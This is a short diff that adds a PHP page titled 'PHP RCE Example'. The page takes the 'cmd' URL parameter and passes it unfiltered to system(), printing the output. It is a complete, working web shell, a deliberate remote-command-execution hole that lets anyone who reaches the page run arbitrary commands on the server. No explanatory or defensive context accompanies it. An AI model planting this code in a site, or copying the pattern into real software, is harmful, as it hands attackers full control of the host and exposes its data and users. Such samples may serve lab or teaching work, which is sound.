@@ -1,0 +1,14 @@
+<html>
+<body>
+<h1>PHP RCE Example</h1>
+
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+
+</body>
+</html>
